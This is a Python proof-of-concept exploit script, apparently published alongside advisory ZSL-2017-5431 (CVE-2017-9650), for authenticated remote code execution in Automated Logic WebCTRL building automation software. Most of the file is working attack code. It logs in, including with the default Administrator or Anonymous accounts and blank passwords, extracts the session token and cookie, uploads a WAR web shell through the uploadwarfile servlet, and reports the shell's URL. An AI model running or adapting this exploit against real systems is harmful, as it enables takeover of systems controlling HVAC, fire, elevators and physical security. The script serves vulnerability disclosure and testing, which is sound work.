#!/usr/bin/env python
# -*- coding: utf8 -*-
#
#
# Automated Logic WebCTRL 6.5 Unrestricted File Upload Remote Code Execution
#
#
# Vendor: Automated Logic Corporation
# Product web page: http://www.automatedlogic.com
# Affected version: ALC WebCTRL, i-Vu, SiteScan Web 6.5 and prior
#                   ALC WebCTRL, SiteScan Web 6.1 and prior
#                   ALC WebCTRL, i-Vu 6.0 and prior
#                   ALC WebCTRL, i-Vu, SiteScan Web 5.5 and prior
#                   ALC WebCTRL, i-Vu, SiteScan Web 5.2 and prior
#
# Summary: WebCTRL®, Automated Logic's web-based building automation
# system, is known for its intuitive user interface and powerful integration
# capabilities. It allows building operators to optimize and manage
# all of their building systems - including HVAC, lighting, fire, elevators,
# and security - all within a single HVAC controls platform. It's everything
# they need to keep occupants comfortable, manage energy conservation measures,
# identify key operational problems, and validate the results.
#
# Desc: WebCTRL suffers from an authenticated arbitrary code execution
# vulnerability. The issue is caused due to the improper verification
# when uploading Add-on (.addons or .war) files using the uploadwarfile
# servlet. This can be exploited to execute arbitrary code by uploading
# a malicious web archive file that will run automatically and can be
# accessed from within the webroot directory. Additionaly, an improper
# authorization access control occurs when using the 'anonymous' user.
# By specification, the anonymous user should not have permissions or
# authorization to upload or install add-ons. In this case, when using
# the anonymous user, an attacker is still able to upload a malicious
# file via insecure direct object reference and execute arbitrary code.
# The anonymous user was removed from version 6.5 of WebCTRL.
#
# Tested on: Microsoft Windows 7 Professional (6.1.7601 Service Pack 1 Build 7601)
#            Apache-Coyote/1.1
#            Apache Tomcat/7.0.42
#            CJServer/1.1
#            Java/1.7.0_25-b17
#            Java HotSpot Server VM 23.25-b01
#            Ant 1.7.0
#            Axis 1.4
#            Trove 2.0.2
#            Xalan Java 2.4.1
#            Xerces-J 2.6.1
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2017-5431
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5431.php
#
# ICS-CERT: https://ics-cert.us-cert.gov/advisories/ICSA-17-234-01
# CVE ID: CVE-2017-9650
# CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9650
#
#
# 30.01.2017
#
#

import itertools
import mimetools
import mimetypes
import cookielib
import binascii
import urllib2
import urllib
import sys
import re
import os

from urllib2 import URLError
global bindata

__author__ = 'lqwrm'

piton = os.path.basename(sys.argv[0])

def bannerche():
  print '''
 @-------------------------------------------------@
 |                                                 |
 |        WebCTRL 6.5 Authenticated RCE PoC        |
 |               ID: ZSL-2017-5431                 |
 |       Copyleft (c) 2017, Zero Science Lab       |
 |                                                 |
 @-------------------------------------------------@
          '''
  if len(sys.argv) < 3:
    print '[+] Usage: '+piton+' <IP> <WAR FILE>'
    print '[+] Example: '+piton+' 10.0.0.17 webshell.war\n'
    sys.exit()

bannerche()

host = sys.argv[1]
filename = sys.argv[2]

with open(filename, 'rb') as f:
    content = f.read()
hexo = binascii.hexlify(content)
bindata = binascii.unhexlify(hexo)

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)

print '[+] Probing target http://'+host

try:
  checkhost = opener.open('http://'+host+'/index.jsp?operatorlocale=en')
except urllib2.HTTPError, errorzio:
  if errorzio.code == 404:
    print '[!] Error 001:'
    print '[-] Check your target!'
    print
    sys.exit()
except URLError, errorziocvaj:
  if errorziocvaj.reason:
    print '[!] Error 002:'
    print '[-] Check your target!'
    print
    sys.exit()

print '[+] Target seems OK.'
print '[+] Login please:'

print '''
Default username: Administrator, Anonymous
Default password: (blank), (blank)
'''

username = raw_input('[*] Enter username: ')
password = raw_input('[*] Enter password: ')

login_data = urllib.urlencode({'pass':password, 'name':username, 'touchscr':'false'})

opener.addheaders = [('User-agent', 'Thrizilla/33.9')]
login = opener.open('http://'+host+'/?language=en', login_data)
auth = login.read()

if re.search(r'productName = \'WebCTRL', auth):
  print '[+] Authenticated!'
  token = re.search('wbs=(.+?)&', auth).group(1)
  print '[+] Got wbs token: '+token
  cookie1, cookie2 = [str(c) for c in cj]
  cookie = cookie1[8:51]
  print '[+] Got cookie: '+cookie
else:
  print '[-] Incorrect username or password.'
  print
  sys.exit()

print '[+] Sending payload.'

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':
    form = MultiPartForm()
    form.add_field('wbs', token)
    form.add_field('file"; filename="'+filename, bindata)
    request = urllib2.Request('http://'+host+'/_common/servlet/lvl5/uploadwarfile')
    request.add_header('User-agent', 'SCADA/8.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()

print '[+] Payload uploaded.'
print '[+] Shell available at: http://'+host+'/'+filename[:-4]
print

sys.exit()